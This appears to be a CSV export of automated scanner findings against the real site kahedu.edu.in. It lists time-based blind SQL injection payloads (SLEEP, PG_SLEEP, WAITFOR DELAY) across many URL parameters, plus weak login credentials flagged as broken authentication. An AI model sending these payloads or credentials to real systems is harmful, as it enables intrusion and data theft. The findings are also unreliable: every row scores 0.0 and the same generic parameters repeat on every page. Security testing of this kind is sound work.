Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/iqac/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/iqac/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/iqac/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/iqac/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/iqac/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/iqac/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/iqac/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Broken Authentication,Critical,0.0,Login Form (https://kahedu.edu.in//login.php),test:asdfasdf,Attacker can gain unauthorized access to user accounts.,Enforce strong password policies and implement account lockout mechanisms.
Broken Authentication,Critical,0.0,Login Form (https://kahedu.edu.in//login.php),demo:000000,Attacker can gain unauthorized access to user accounts.,Enforce strong password policies and implement account lockout mechanisms.
Broken Authentication,Critical,0.0,Login Form (https://kahedu.edu.in//login.php),guest:000000,Attacker can gain unauthorized access to user accounts.,Enforce strong password policies and implement account lockout mechanisms.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
